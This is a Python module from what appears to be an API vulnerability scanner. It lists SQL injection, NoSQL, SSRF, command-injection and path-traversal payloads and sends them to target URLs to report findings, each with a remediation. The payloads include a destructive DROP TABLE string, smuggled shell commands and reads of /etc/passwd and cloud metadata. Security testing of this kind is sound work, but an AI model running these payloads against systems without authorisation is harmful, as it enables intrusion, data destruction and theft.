"""
Injection Module
- SQL Injection (error-based, time-based)
- NoSQL Injection
- SSRF (Server-Side Request Forgery)
- Command Injection
- Path Traversal
"""
import httpx
import time
from typing import List, Dict, Any

SQLI_PAYLOADS = [
    ("' OR '1'='1", "error-based SQLi"),
    ("\" OR \"1\"=\"1", "error-based SQLi"),
    ("'; DROP TABLE users;--", "error-based SQLi"),
    ("1 OR 1=1", "error-based SQLi"),
    ("admin'--", "auth-bypass SQLi"),
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-01756", "pg::syntaxerror",
    "sqlite3.operationalerror", "syntax error", "unclosed quotation",
    "you have an error in your sql", "sqlstate", "odbc drivers",
    "microsoft oledb provider", "jdbc", "invalid query",
]

NOSQLI_PAYLOADS = [
    '{"$gt": ""}',
    '{"$where": "sleep(5000)"}',
    '{"$ne": null}',
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/admin",
    "http://localhost:22",
    "http://0.0.0.0/",
    "file:///etc/passwd",
]

CMDI_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "& cat /etc/passwd",
    "; ping -c 5 127.0.0.1",
    "`id`",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
]


async def test_sqli(client: httpx.AsyncClient, url: str, method: str, params: list, headers: dict) -> List[Dict]:
    findings = []
    for param in params:
        if param.get("in") not in ("query", "path"):
            continue
        param_name = param.get("name", "id")
        for payload, ptype in SQLI_PAYLOADS:
            try:
                test_url = f"{url}?{param_name}={payload}" if method == "GET" else url
                resp = await client.request(method, test_url, headers=headers, timeout=10)
                body = resp.text.lower()
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig in body:
                        findings.append({
                            "title": f"SQL Injection — {ptype}",
                            "category": "Injection",
                            "severity": "critical",
                            "owasp_ref": "API8:2023",
                            "cvss_score": 9.0,
                            "description": f"Parameter `{param_name}` on {method} {url} appears "
                                           f"vulnerable to SQL injection. The payload `{payload}` "
                                           f"triggered a database error signature in the response.",
                            "remediation": "Use parameterized queries / prepared statements. "
                                           "Never concatenate user input into SQL strings. "
                                           "Apply input validation and output encoding.",
                            "request_raw": f"{method} {test_url}\nPayload: {payload}",
                            "response_raw": f"HTTP {resp.status_code}\n{resp.text[:500]}",
                        })
                        break
            except Exception:
                pass
    return findings


async def test_ssrf(client: httpx.AsyncClient, url: str, method: str, params: list, headers: dict) -> List[Dict]:
    findings = []
    url_params = [p for p in params if "url" in p.get("name", "").lower() or "redirect" in p.get("name", "").lower() or "callback" in p.get("name", "").lower()]
    for param in url_params:
        param_name = param.get("name", "url")
        for payload in SSRF_PAYLOADS:
            try:
                test_url = f"{url}?{param_name}={payload}"
                resp = await client.request(method, test_url, headers=headers, timeout=8)
                # Heuristic: connection refused means the server tried to connect
                body = resp.text.lower()
                if any(sig in body for sig in ["ami-id", "instance-id", "root:", "administrator", "169.254"]):
                    findings.append({
                        "title": "Server-Side Request Forgery (SSRF)",
                        "category": "SSRF",
                        "severity": "critical",
                        "owasp_ref": "API7:2023",
                        "cvss_score": 9.1,
                        "description": f"Parameter `{param_name}` on {method} {url} appears to "
                                       f"allow SSRF. The cloud metadata endpoint payload returned "
                                       f"internal data in the response.",
                        "remediation": "Validate and allowlist URL schemes and destinations. "
                                       "Block internal IP ranges (RFC1918, 169.254.x.x). "
                                       "Use a dedicated HTTP client library with SSRF protection.",
                        "request_raw": f"{method} {test_url}\nSSRF Payload: {payload}",
                        "response_raw": f"HTTP {resp.status_code}\n{resp.text[:500]}",
                    })
            except Exception:
                pass
    return findings


async def test_path_traversal(client: httpx.AsyncClient, url: str, method: str, params: list, headers: dict) -> List[Dict]:
    findings = []
    file_params = [p for p in params if any(kw in p.get("name", "").lower() for kw in ["file", "path", "dir", "name", "doc"])]
    for param in file_params:
        param_name = param.get("name", "file")
        for payload in PATH_TRAVERSAL_PAYLOADS:
            try:
                test_url = f"{url}?{param_name}={payload}"
                resp = await client.request(method, test_url, headers=headers, timeout=8)
                if "root:" in resp.text or "administrator" in resp.text.lower():
                    findings.append({
                        "title": "Path Traversal Vulnerability",
                        "category": "Path Traversal",
                        "severity": "high",
                        "owasp_ref": "API8:2023",
                        "cvss_score": 7.5,
                        "description": f"Parameter `{param_name}` appears vulnerable to path "
                                       f"traversal. System file content was returned in the response.",
                        "remediation": "Canonicalize file paths and validate they stay within "
                                       "the intended directory. Use os.path.realpath() and "
                                       "enforce a base directory restriction.",
                        "request_raw": f"GET {test_url}",
                        "response_raw": f"HTTP {resp.status_code}\n{resp.text[:300]}",
                    })
            except Exception:
                pass
    return findings
